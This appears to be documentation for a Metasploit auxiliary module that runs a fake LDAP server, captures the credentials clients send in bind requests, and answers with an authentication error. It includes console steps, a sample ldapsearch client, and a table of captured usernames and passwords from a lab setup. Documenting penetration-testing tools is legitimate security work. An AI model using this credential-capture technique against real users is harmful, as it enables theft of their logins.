
## Vulnerable Application

This module emulates an LDAP Server which accepts User Bind Request to capture the User Credentials.
Upon receiving successful Bind Request, a `ldap_bind: Authentication method not supported (7)` error is sent to the User

## Verification Steps

1. Start msfconsole
2. Do: `use auxiliary/server/capture/ldap`
3. Do: `run`
4. From a new shell or workstation, perform a ldap bind request involving User credentials.
5. Check the database using `creds` for the user authentication information.

## Options

  **Authentication**
  
The type of LDAP authentication to capture. The default type is `Simple`

## Scenarios

### Metasploit Server

```
msf6 > use auxiliary/server/capture/ldap
msf6 auxiliary(server/capture/ldap) > run

[*] Server started.
[+] LDAP Login attempt => From:10.0.2.15:48198 Username:User Password:Pass
```

### Client

```
└─$ ldapsearch -LLL -H ldap://10.0.2.15 -D cn=User,dc=example,dc=com -W
Enter LDAP Password: 
ldap_bind: Auth Method Not Supported (7)
        additional info: Auth Method Not Supported
```

**Database**

```
msf6 auxiliary(server/capture/ldap) > creds
Credentials
===========

host       origin     service         public  private  realm        private_type  JtR Format
----       ------     -------         ------  -------  -----        ------------  ----------
10.0.2.15  10.0.2.15  389/tcp (ldap)  User    Pass     example.com  Password      
```